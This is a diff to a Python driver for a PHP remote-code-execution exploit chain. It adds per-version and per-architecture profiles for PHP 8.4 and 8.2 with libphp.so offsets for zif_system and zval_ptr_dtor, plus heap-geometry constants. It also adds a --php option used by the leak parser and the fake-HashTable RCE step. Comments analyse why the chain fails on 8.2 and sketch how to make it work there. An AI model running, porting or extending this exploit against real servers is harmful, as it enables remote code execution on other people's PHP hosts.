@@ -38,24 +38,108 @@ R = HERE
 PURE = os.path.join(HERE, "pure")
 Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
 LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
-# pointers-to-main-chunk fingerprint in the LEAK_SPEC window (stable count)
-MAIN_BUCKET_COUNT = 87
+ARCHS = ("x86_64", "aarch64")
+
+# Per-version, per-arch exploit profile.  Every constant that is not a pure
+# symbol offset lives here, so adding a PHP version means filling one block
+# rather than hunting hardcoded magic numbers across the chain:
+#   dtor_offset   offset of zval_ptr_dtor inside libphp.so  (readelf, static)
+#   zif_offset    offset of zif_system inside libphp.so     (readelf, static)
+#   ptr_max       upper bound for a kernel-heap pointer (arch-wide, not versioned)
+#   delta_min/max accepted distance libphp_base - main_chunk_bucket (heap geometry)
+#   s_offset      offset of the target slot inside the main heap chunk; the fake
+#                 HashTable is placed at S = main_chunk_bucket + s_offset (heap geometry)
+#   main_bucket   pointer count of the main chunk's 2M bucket in the B1 leak window
+#                 (heap geometry; used to disambiguate the main chunk from neighbours)
+#
+# Symbol offsets are static (readelf).  Heap-geometry constants (delta_min/max,
+# s_offset, main_bucket) are calibrated live against a running worker of the
+# exact image -- see README "Multi-version support".
+#
+# 8.4 block: the original 8.4.26 calibration, unchanged -- the chain still works
+# end to end against `--php 8.4`.
+#
+# 8.2 block: the two SYMBOL offsets (dtor_offset, zif_offset) are verified by
+# readelf against the official php:8.2.34-apache image on BOTH arches.  The
+# HEAP-GEOMETRY constants below are NOT calibrated for 8.2 -- they are the 8.4
+# values, copied in so the profile is structurally complete.  THIS IS NOT
+# SUFFICIENT FOR RCE.  As of this commit, B1 produces no leak on 8.2 and the
+# chain does not achieve RCE.  Live gdb analysis on php:8.2.34-apache (aarch64,
+# this branch) shows the root cause, and it is NOT a heap-geometry constant:
+#
+#   On 8.4, A1's OOM fires in php_session_send_cookie() -> php_url_encode()
+#   (called from php_session_reset_id, before track_init/s_read/decode).  That
+#   path is NOT wrapped in zend_try, so the longjmp leaves PS(id) dangling and
+#   session_status=active -- B1 then reads through the reallocated id buffer.
+#
+#   On 8.2, the rfc1867 FILE_START handler sets PS(send_cookie)=0 (same source
+#   line in both), so php_session_reset_id() skips send_cookie and the OOM
+#   instead lands in php_session_decode() -> php_var_unserialize_init().  That
+#   path IS wrapped in zend_try, and its zend_catch runs php_session_cancel_decode
+#   -> php_session_destroy -> php_rshutdown_session_globals, which releases
+#   PS(id) before the longjmp escapes.  After A1 completes, PS(id)=NULL and
+#   session_status=none on 8.2 -- there is nothing dangling for B1 to read.
+#   Confirmed across A1 sweeps (big=78..110, progress_len=16): every run leaves
+#   PS(id)=0.
+#
+# Making 8.2 RCE work needs a different A1 shape that forces the OOM back into
+# the unwrapped send_cookie/url_encode path on 8.2 (e.g. reordering fields so
+# a FILE_START-triggered allocation tips the limit inside reset_id, or sending
+# send_cookie=1 via the cookie path), then re-deriving delta_min/max + s_offset
+# + main_bucket for 8.2 from a real B1 leak.  That work is not done here; the
+# 8.2 heap-geometry values are deliberately left at the 8.4 defaults.
 PROFILES = {
-    "x86_64": {
-        "dtor_offset": 0x65EB60,
-        "zif_offset": 0x465370,
-        "ptr_max": 0x7FFFFFFFFFFF,
-        "delta_min": 0x1A00000,
-        "delta_max": 0x1F00000,
+    "8.4": {
+        "x86_64": {
+            "dtor_offset": 0x65EB60,
+            "zif_offset": 0x465370,
+            "ptr_max": 0x7FFFFFFFFFFF,
+            "delta_min": 0x1A00000,
+            "delta_max": 0x1F00000,
+            "s_offset": 0xF8398,
+            "main_bucket": 87,
+        },
+        "aarch64": {
+            "dtor_offset": 0x63812B,
+            "zif_offset": 0x42CD70,
+            "ptr_max": 0xFFFFFFFFFFFF,
+            "delta_min": 0x1F00000,
+            "delta_max": 0x2300000,
+            "s_offset": 0xF8398,
+            "main_bucket": 87,
+        },
     },
-    "aarch64": {
-        "dtor_offset": 0x63812B,
-        "zif_offset": 0x42CD70,
-        "ptr_max": 0xFFFFFFFFFFFF,
-        "delta_min": 0x1F00000,
-        "delta_max": 0x2300000,
+    "8.2": {
+        "x86_64": {
+            "dtor_offset": 0x487650,
+            "zif_offset": 0x39b8a0,
+            "ptr_max": 0x7FFFFFFFFFFF,
+            # 8.2 heap geometry NOT yet calibrated -- see block comment above.
+            "delta_min": 0x1A00000,
+            "delta_max": 0x1F00000,
+            "s_offset": 0xF8398,
+            "main_bucket": 87,
+        },
+        "aarch64": {
+            "dtor_offset": 0x4606c0,
+            "zif_offset": 0x36ff48,
+            "ptr_max": 0xFFFFFFFFFFFF,
+            # 8.2 heap geometry NOT yet calibrated -- see block comment above.
+            "delta_min": 0x1F00000,
+            "delta_max": 0x2300000,
+            "s_offset": 0xF8398,
+            "main_bucket": 87,
+        },
     },
 }
+
+# 8.2-vs-8.4 build differences that break a naive readelf extraction (the two
+# static offsets above are already adjusted for them):
+#   * libphp.so is at /usr/lib/apache2/modules/libphp.so on the Debian-based
+#     8.2 image, NOT /usr/local/lib/apache2/modules/libphp.so as on 8.4.
+#   * zif_system is a LOCAL (not GLOBAL) symbol in the 8.2 build, so
+#     `readelf -Ws ... | grep -w zif_system` finds it but filtering on GLOBAL
+#     first would drop it.
 
 
 def send_chunked(port: int, path: str, body_file: str, timeout: float,
@@ -90,7 +174,7 @@ def send_plain(port: int, path: str, body: bytes, timeout: float = 120.0) -> byt
     return bytes(out)
 
 
-def parse_leak(resp: bytes, profile=None):
+def parse_leak(resp: bytes, profile=None, php_version="8.4"):
     i = resp.find(b"Set-Cookie: PHPSESSID=")
     if i < 0:
         raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
@@ -107,9 +191,10 @@ def parse_leak(resp: bytes, profile=None):
     zdtor, n = counts.most_common(1)[0]
     if profile is None:
         arch = "aarch64" if zdtor > 0x7FFFFFFFFFFF else "x86_64"
-        profile = PROFILES[arch]
+        profile = PROFILES[php_version][arch]
     else:
-        arch = next((name for name, prof in PROFILES.items() if prof is profile),
+        # find the arch of the supplied concrete profile for reporting
+        arch = next((a for a in ARCHS if PROFILES[php_version][a] is profile),
                     "unknown")
     if profile["ptr_max"] != 0xFFFFFFFFFFFF:
         counts = Counter({q: c for q, c in counts.items()
@@ -127,7 +212,7 @@ def parse_leak(resp: bytes, profile=None):
     cands = [(b, c) for b, c in buckets.most_common()
              if b not in (lib_bucket, id_bucket)]
     # prefer the bucket whose pointer count matches the stable fingerprint
-    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
+    cands.sort(key=lambda bc: (abs(bc[1] - profile["main_bucket"]), bc[1]))
     return {
         "decoded": len(dec),
         "arch": arch,
@@ -171,7 +256,10 @@ def hold_workers(port: int, workers: int):
 def main() -> int:
     ap = argparse.ArgumentParser()
     ap.add_argument("--port", type=int, default=18110)
-    ap.add_argument("--arch", choices=("auto",) + tuple(PROFILES),
+    ap.add_argument("--php", choices=tuple(PROFILES), default="8.4",
+                    help="target PHP version to calibrate heap geometry for "
+                         "(default: 8.4)")
+    ap.add_argument("--arch", choices=("auto",) + ARCHS,
                     default="auto",
                     help="target architecture (default: auto from the leak)")
     ap.add_argument("--restart", default="",
@@ -185,7 +273,8 @@ def main() -> int:
     ap.add_argument("--workers", type=int, default=150,
                     help="prefork MaxRequestWorkers (1 = no pinning)")
     args = ap.parse_args()
-    profile = None if args.arch == "auto" else PROFILES[args.arch]
+    profile = (None if args.arch == "auto"
+               else PROFILES[args.php][args.arch])
 
     os.makedirs(args.outdir, exist_ok=True)
     if os.path.exists(args.proof):
@@ -238,7 +327,7 @@ def run_chain(args, holders, profile) -> int:
         leak_file = os.path.join(tmp, "leak.resp")
         try:
             resp = send_chunked(args.port, "/index.php", b1, args.timeout, leak_file)
-            info = parse_leak(resp, profile)
+            info = parse_leak(resp, profile, args.php)
         except Exception as exc:
             print("      leak failed: %r" % (exc,))
             continue
@@ -258,7 +347,7 @@ def run_chain(args, holders, profile) -> int:
 
         zif = info["lib"] + prof["zif_offset"]
         for cand in info["main_candidates"]:
-            S = cand + 0xF8398
+            S = cand + prof["s_offset"]
             print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
                 attempt, cand, S, zif))
             subprocess.run([sys.executable, os.path.join(PURE, "cheap_oom_a.py"),
